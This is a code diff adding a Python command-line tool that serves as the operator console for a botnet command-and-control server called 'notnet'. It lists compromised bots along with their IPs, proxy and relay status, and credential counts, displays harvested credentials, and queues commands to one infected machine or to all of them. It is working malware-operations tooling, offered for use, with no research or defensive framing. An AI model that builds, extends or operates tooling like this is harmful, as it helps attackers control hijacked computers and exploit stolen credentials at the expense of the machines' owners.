@@ -1,0 +1,104 @@
+#!/usr/bin/env python3
+"""notnet C2 operator CLI.
+
+Talks to the running C2's console API (default http://127.0.0.1:8090).
+
+  c2ctl bots                      list bots + inventory
+  c2ctl creds                     show harvested credentials
+  c2ctl commands                  show command queue history
+  c2ctl queue <cmd> [args...]     queue a command (--target TAG = one bot)
+"""
+
+import argparse
+import json
+import sys
+import urllib.request
+
+DEFAULT_API = "http://127.0.0.1:8090"
+
+
+def api(base, path, method="GET", body=None):
+    url = base.rstrip("/") + path
+    data = json.dumps(body).encode() if body is not None else None
+    req = urllib.request.Request(url, data=data, method=method,
+                                 headers={"Content-Type": "application/json"})
+    try:
+        with urllib.request.urlopen(req, timeout=10) as r:
+            return json.loads(r.read().decode())
+    except Exception as e:
+        sys.stderr.write(f"c2ctl: {e}\n")
+        sys.exit(1)
+
+
+def cmd_bots(base):
+    j = api(base, "/api/bots")
+    bots = j.get("bots", [])
+    if not bots:
+        print("no bots seen")
+        return
+    print(f"{'HOSTNAME':22} {'TAG':18} {'IP':16} {'VER':12} "
+          f"{'UP':>6} {'SCAN':>4} {'CRED':>4} {'PROXY':>10} {'RELAY':>10} "
+          f"{'CH':>4} {'SEEN':>5}")
+    for b in bots:
+        proxy = f"on:{b.get('proxy_port')}" if b.get("proxy_on") else "off"
+        relay = f"on:{b.get('relay_port')}" if b.get("relay_on") else "off"
+        print(f"{b.get('hostname',''):22} {(b.get('tag') or ''):18} "
+              f"{(b.get('ip') or ''):16} {(b.get('version') or ''):12} "
+              f"{b.get('uptime',0):6} {b.get('scan_count',0):4} "
+              f"{b.get('cred_count',0):4} {proxy:10} {relay:10} "
+              f"{(b.get('channel') or ''):4} {b.get('ago',0):5}")
+
+
+def cmd_creds(base):
+    for c in api(base, "/api/creds").get("creds", []):
+        print(f"{c[0]:5} {c[1]}")
+
+
+def cmd_commands(base):
+    for c in api(base, "/api/commands").get("commands", []):
+        served = f"@ {round(c[5])}" if c[5] else "pending"
+        print(f"{c[0]:4} -> {c[1] or 'any':18} {c[2]:10} {c[3] or '':30} "
+              f"queued={round(c[4])} {served} {c[6] or ''}")
+
+
+def cmd_queue(base, target, cmd, args):
+    j = api(base, "/api/queue", method="POST",
+            body={"target": target, "cmd": cmd, "args": args})
+    print(f"queued id={j.get('id')} cmd={j.get('cmd')} "
+          f"target={j.get('target') or 'any'}")
+
+
+def main():
+    ap = argparse.ArgumentParser(description="notnet C2 operator CLI")
+    ap.add_argument("--api", default=os_env_api())
+    sub = ap.add_subparsers(dest="action", required=True)
+
+    p = sub.add_parser("bots")
+    p.set_defaults(fn=cmd_bots)
+
+    p = sub.add_parser("creds")
+    p.set_defaults(fn=cmd_creds)
+
+    p = sub.add_parser("commands")
+    p.set_defaults(fn=cmd_commands)
+
+    p = sub.add_parser("queue")
+    p.add_argument("--target", default="")
+    p.add_argument("cmd")
+    p.add_argument("args", nargs=argparse.REMAINDER, default=[])
+    p.set_defaults(fn=cmd_queue)
+
+    args = ap.parse_args()
+    if args.action == "queue":
+        args.fn(args.api, args.target, args.cmd, " ".join(args.args))
+    else:
+        args.fn(args.api)
+
+
+def os_env_api():
+    import os
+    return os.environ.get("NOTNET_C2_API", DEFAULT_API)
+
+
+if __name__ == "__main__":
+    main()
